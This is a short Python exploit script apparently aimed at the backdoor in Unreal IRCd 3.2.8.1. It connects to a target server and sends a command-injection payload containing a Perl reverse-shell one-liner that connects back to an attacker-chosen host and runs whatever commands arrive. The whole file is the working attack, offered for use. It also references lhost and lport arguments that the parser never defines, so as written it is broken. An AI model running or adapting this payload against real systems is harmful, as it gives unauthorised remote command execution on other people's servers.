import argparse
import socket
import subprocess
import time

parser = argparse.ArgumentParser(description='Manual exploit for Unreal IRCd 3.2.8.1')
parser.add_argument('-t', '--target', dest='target', help='Target IP address', required=True)
parser.add_argument('-p', '--remote-port', dest='port', help='Target port', type=int, required=True)
args = parser.parse_args()

ip = args.target
port = args.port

print('Made by sergiovks (SezioS)')

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((str(ip), int(port)))

a = s.recv(1024)
print('Sending payload')

a = f"AB;perl -MIO -e '$p=fork;exit,if($p);foreach my $key(keys %ENV){{if($ENV{{$key}}=~/(.*)/){{$ENV{{$key}}=$1;}}}}$c=new IO::Socket::INET(PeerAddr,\"{args.lhost}:{args.lport}\");STDIN->fdopen($c,r);$~->fdopen($c,w);while(<>){{if($_=~ /(.*)/){{system $1;}}}};'"

s.sendall(a.encode())
print(f'Listener running on {args.lhost}:{args.lport}')
print(f'Waiting for incoming connections from {ip}...')
